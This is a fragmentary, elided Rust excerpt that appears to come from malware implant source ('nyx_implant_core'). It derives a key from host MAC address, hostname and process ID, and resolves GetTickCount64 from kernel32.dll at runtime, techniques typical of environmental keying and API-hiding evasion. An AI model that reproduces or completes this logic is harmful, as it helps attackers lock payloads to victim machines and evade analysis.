...
pub fn apply_layers(key: &mut [u8; 32], layers_bitmap: u32) {
    ...
    if layers_bitmap & LAYER_NETWORK != 0 {
        if let Some(mac) = nyx_implant_core::hostinfo::primary_mac() {
            let host = nyx_implant_core::hostinfo::hostname();
    ...
    if layers_bitmap & LAYER_TEMPORAL != 0 {
        let pid = nyx_implant_core::hostinfo::pid();
...
fn get_tick_count() -> u64 {
    ...
    match unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetTickCount64") } {
        Some(a) => {
